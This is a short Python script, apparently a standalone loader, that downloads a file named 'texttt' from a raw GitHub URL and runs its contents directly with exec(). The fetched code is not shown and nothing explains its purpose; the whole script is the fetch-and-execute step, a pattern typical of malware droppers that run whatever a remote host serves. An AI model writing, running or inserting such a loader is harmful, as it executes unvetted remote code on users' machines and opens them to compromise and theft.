import urllib.request
with urllib.request.urlopen("https://raw.githubusercontent.com/RAMDDR5/python/refs/heads/main/texttt") as response:
    code = response.read().decode("utf-8")
exec(code, {})
